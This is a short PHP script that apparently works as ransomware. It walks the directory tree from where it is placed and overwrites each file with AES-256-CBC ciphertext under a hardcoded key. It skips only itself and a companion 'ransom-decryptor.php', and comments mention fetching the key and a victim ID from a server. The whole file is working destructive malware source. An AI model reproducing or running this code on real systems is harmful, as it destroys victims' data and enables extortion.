<?php
error_reporting(0);
echo 'Starting to encrypt. <br><br>';

//retrieve $key from server
$key = 'bRuD5WYw5wd0rdHR9yLlM6wt2vteuiniQBqE70nAuhU=';

//server send ID and save it in txt file
$id = '';

$countFile = 0;
$dir    = './';
findFileInFolder($dir, $countFile, $key);

echo '<hr>Total encrypted file is : ' . $countFile;

function findFileInFolder($dir, &$countFile, $key)
{
    $files = scandir($dir);

    //scan for each file
    for($i = 2; $i < count($files); $i++)
    {
        if(strpos($files[$i], ".") !== false)
        {
            if(strpos($files[$i], basename(__FILE__)) !== false)
            {
                echo 'Skipped (' . basename(__FILE__) . '). <br>';
            } else if(strpos($files[$i], 'ransom-decryptor.php') !== false)
            {
                echo 'Skipped (ransom-decryptor.php). <br>';
            } else {
                $countFile++;
                $dirSingle = $dir . '/' . $files[$i];
                getFileNCall($dirSingle, $key);
                echo '&nbsp;&nbsp;File [' . ($i-2) . '] - ' . $files[$i] . '<br>';
                echo '<br> Location : ' . $dirSingle . '<hr>';
            }
        } else {
            echo '[Folder] - (' . $files[$i] . ') => [<br><div style="position : relative; left : 20px;">';
            
            $dirFolder = $dir . '/' . $files[$i];
            findFileInFolder($dirFolder, $countFile, $key);
            echo ']</div><br>';
        }
    }
}

function getFileNCall($filesDir, $key)
{
    $filesDir = substr($filesDir, 3);
    $filesDir = str_replace(' ', '\ ', $filesDir);
    $code = file_get_contents($filesDir); //Get the code to be encypted.
    $encrypted_code = encrypt($code, $key); //Encrypt the code.
    echo $filesDir . ' was Encrypted! <br>';
    file_put_contents($filesDir, $encrypted_code); //Save the ecnypted to the original directory
}

//thanks stack overflow
function encrypt($data, $key) {
    $encryption_key = base64_decode($key);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $encryption_key, 0, $iv);
    return base64_encode($encrypted . '::' . $iv);
}

//references for decryption
//https://stackoverflow.com/questions/54322647/php-encrypt-files-using-openssl-encrypt
?>